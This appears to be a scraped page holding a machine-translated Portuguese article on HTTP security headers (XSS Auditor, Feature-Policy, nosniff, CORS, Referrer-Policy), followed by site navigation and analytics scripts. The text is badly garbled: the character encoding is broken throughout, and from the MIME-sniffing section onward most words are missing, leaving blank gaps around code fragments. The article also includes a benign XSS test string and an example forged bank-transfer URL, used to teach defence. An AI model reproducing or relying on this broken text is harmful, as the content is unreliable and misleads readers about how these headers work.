prote√ß√£o XSS est√° ativada. .  Se inserirmos uma string maliciosa no campo de pesquisa, como, por exemplo, o navegador se recusa educadamente a executar o script e explica o motivo de sua decis√£o: <br><br><pre> <code class="plaintext hljs">The XSS Auditor refused to execute a script in 'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on' because its source code was found within the request. The server sent an 'X-XSS-Protection' header requesting this behavior.</code> </pre> <br>  Ainda mais interessante √© o comportamento padr√£o no Chrome quando uma pol√≠tica CSP ou XSS n√£o √© especificada em uma p√°gina da web.  Um script que podemos testar adicionando o par√¢metro <code>xss=off</code> ao nosso URL ( <code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code> ): <br><br><img src="https://habrastorage.org/getpro/habr/post_images/938/8c4/6fd/9388c46fd9f6c9370d0f9ff3b2a65210.png" alt="imagem"><br><br>  Surpreendentemente, o Chrome √© cuidadoso o suficiente para impedir a renderiza√ß√£o da p√°gina, dificultando a cria√ß√£o de XSS espelhado.  Impressionante o qu√£o longe os navegadores foram. <br><br><h3>  Pol√≠tica de recursos </h3><br>  Em julho de 2018, o pesquisador de seguran√ßa <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Scott Helm</a> postou uma <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">postagem de blog</a> muito interessante detalhando o novo t√≠tulo de seguran√ßa: <code>Feature-Policy</code> . <br><br>  Atualmente suportado por muito poucos navegadores (Chrome e Safari no momento da reda√ß√£o deste artigo), esse cabe√ßalho nos permite determinar se um recurso espec√≠fico do navegador est√° ativado na p√°gina atual.  Com sintaxe muito semelhante ao CSP, n√£o devemos ter problemas para entender o significado das pol√≠ticas de fun√ß√£o, como as seguintes: <br><br><pre> <code class="plaintext hljs">Feature-Policy: vibrate 'self'; push *; camera 'none'</code> </pre> <br>  Se tivermos todas as d√∫vidas sobre como essa pol√≠tica afeta a API do navegador, podemos simplesmente analis√°-la: <br><br><ul><li>  <code>vibrate 'self'</code> : permite que a p√°gina atual use a API de vibra√ß√£o e qualquer quadro no site atual. </li><li>  <code>push *</code> : a p√°gina atual e qualquer quadro podem usar a API de notifica√ß√£o por push </li><li>  <code>camera 'none'</code> : o acesso √† API da c√¢mera √© negado nesta p√°gina e em todos os quadros </li></ul><br>  A pol√≠tica de recursos tem um pouco de hist√≥ria.  Se o seu site permitir que os usu√°rios tirem selfies ou gravem √°udio, seria muito √∫til usar uma pol√≠tica que restrinja o acesso √† API atrav√©s da sua p√°gina em outros contextos. <br><br><h3>  Op√ß√µes de tipo de conte√∫do X </h3><br>  √Äs vezes, os recursos inteligentes do navegador acabam nos prejudicando em termos de seguran√ßa.  Um exemplo excelente √© o sniffing MIME, uma t√©cnica popular no Internet Explorer. <br><br> MIME- ‚Äî       ( )    . ,      <code>/awesome-picture.png</code> ,          (, <code>Content-Type: text/plain</code> ).     ,       . <br><br>    , IE   ,    MIME-:     ¬´¬ª  ,  ,      ,      <code>Content-Type</code> ,   ,  ,       ,  . <br><br>     -,       ,  ,     <code>/test.jpg</code> ,   JavaScript. ,   ?    ,       HTML ,     ,   ¬´¬ª,     .    ,  ,   ,      . <br><br>    ,     <code>X-Content-Type-Options: nosniff</code> ,    MIME-:     ,   ,           ,       .  ,   ,       ,       . <br><br><h3> Cross-Origin Resource Sharing (CORS) </h3><br>    JavaScript HTTP-      .  , AJAX-  <code>example.com</code>     <code>example.com</code> . <br><br>    ,         ‚Äî  cookie,       . ,       <code>win-a-hummer.com</code> ,     AJAX  <code>your-bank.com</code> .     - ,    HTTP-    ,    ,   ,    . <br><br>         AJAX   ,        Cross Origin Resource Sharing (CORS),  ,     . <br><br> ,    CORS,  ,        ,     ¬´¬ª  CORS. <br><br> ,       ,  ,     <code>Access-Control-Allow-Origin</code>    , ,       . <br><br>       <code>Access-Control-Allow-Origin: *</code> ,         ,     ,   URL-,       ,   <code>Access-Control-Allow-Origin: https://example.com</code> . <br><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">github.com/odino/wasec/tree/master/cors</a> ,  ,         .   ,    AJAX  <code>test-cors</code>  <code>test-cors-2</code>      .   test-cors-2    CORS,   ,   .    <code>http://cors-test:7888/?cors=on</code> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bae/c57/e2f/baec57e2f48c17748ce2d6202985c559.png" alt="imagem"><br><br>      <code>cors</code>  URL,         : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/68d/3aa/ae1/68d3aaae10cb6f226ae1c0a1c9a96d27.png" alt="imagem"><br><br>  ,    ,   ,    ,        .   ,        ,          . , ,       ,    <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker.</code>    ! <br><br>       , <code>GET</code> -   ,   ,     <code>POST</code> -?  ,      ,     ,    <code>http://cors-test:7888/?method=POST</code> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e73/f4e/9a0/e73f4e9a003a2cb60cf6c952bc8d21e6.png" alt="imagem"><br><br>      <code>POST</code> ,        ,    ¬´ ¬ª.    ,   <code>OPTIONS</code>     ,    .       ,    ,    <code>POST</code>    . <br><br>     : <br><br><ul><li> CORS ‚Äî    .   ,     ,         ,   . </li><li>    API,     <code>GET</code> .        ,     . </li></ul><br>    ,        -,       ,    ,     CORS.  ,   ,   <code>example.com</code> ,     <code>example.com/_proxy/other.com</code> ,    ,   <code>_proxy/other.com/*</code> ,    <code>other.com</code> . <br><br>       , ,       CORS,  MDN    ,       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a> . <br><br><h3> X-Permitted-Cross-Domain-Policies </h3><br>    CORS, <code>X-Permitted-Cross-Domain-Policies</code>       Adobe ( , Flash  Acrobat). <br><br>      ,    ,      .  ,  Adobe      <code>crossdomain.xml</code>    ,    ,  <code>X-Permitted-Cross-Domain-Policies</code>       . <br><br>  ?      <code>X-Permitted-Cross-Domain-Policies: none</code>   ,       Flash. <br><br><h3> Referrer-Policy </h3><br>      , ,      .   <code>Referer</code> ,       .     URL     ,   . <br><br> ,  ,      .    ,     .   <code>Referer</code>        .    ,    ,              . <br><br>  <code>Referrer-Policy</code> ,    2017         ,        ,  ,      URL-   <code>Referer</code>     . <br><br>      ,    <code>Referrer-Policy</code> : <br><br><ul><li> <code>no-referrer</code> :  <code>Referer</code>    </li><li> <code>origin</code> :  <code>https://example.com/private-page</code>  <code>https://example.com/</code> </li><li> <code>same-origin</code> :  <code>Referer</code>    ,       </li></ul><br>  ,      <code>Referred-Policy</code> ( <code>strict-origin</code> , <code>no-referrer-when-downgrade</code>  . .),  ,    , ,      .       ,    ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">     OWASP</a> . <br><br>  <code>Origin</code>    <code>Referer</code> ,        ,  ,          .  <code>Origin</code>  ,       .             -:  <code>Origin</code>     ,   . <br><br>   ,   HTTP-,   cURL,     :  c <code>url -H "Origin: example.com" api.example.com</code>        origin ‚Ä¶‚Ä¶         <code>Origin</code> ( <code>Referer</code> ,     )        . <br><br><h3>    </h3><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">securityheaders.com</a> ,   -,    ,    -   ,   .  ,    URL,         .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://securityheaders.com/%3Fq%3D">   facebook.com</a> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8dd/8ef/5a6/8dd8ef5a6215f292b95bfae1b9c8ef16.png" alt="imagem"><br><br>     ,   , securityheaders.com ‚Äî  ,    . <br><br><h3> HTTP   :     cookie </h3><br>           HTTP,     ,     -      ,       . <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://medium.freecodecamp.org/web-security-hardening-"> </a>           HTTP: . <br><br>   ,   -   HTTP   , , ,  ( )         -:     - ,     ,     ¬´   ¬ª.   ,  cookie       ,           . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt434228/">https://habr.com/ru/post/pt434228/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt434218/index.html">Simples clicker bot Java no exemplo do jogo World of Warcraft 3.3.5a</a></li>
<li><a href="../pt434220/index.html">Entrando na Aeronet: lan√ßando um quadroc√≥ptero aut√¥nomo em um ambiente virtual</a></li>
<li><a href="../pt434222/index.html">Esta√ß√£o terrestre da Amazon para aluguel - receba e processe dados de sat√©lites</a></li>
<li><a href="../pt434224/index.html">Eventos digitais em Moscou, de 24 a 30 de dezembro</a></li>
<li><a href="../pt434226/index.html">Habrautilidade para coleta de haastastatistics em habrablogs</a></li>
<li><a href="../pt434230/index.html">Apresenta√ß√£o dos scanners 3D GOM Atos 5 / 5X na Top 3D Expo</a></li>
<li><a href="../pt434234/index.html">M√©todo de raia de nata√ß√£o</a></li>
<li><a href="../pt434236/index.html">A rede neural com uma ameba resolveu o problema do vendedor ambulante em 8 cidades</a></li>
<li><a href="../pt434238/index.html">Intel OpenVINO no Raspberry Pi: colheita de 2018</a></li>
<li><a href="../pt434244/index.html">Sou comerciante de algo da m√£e: procurando estruturas gratuitas para testar hip√≥teses e iniciar no modo de batalha (Python)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>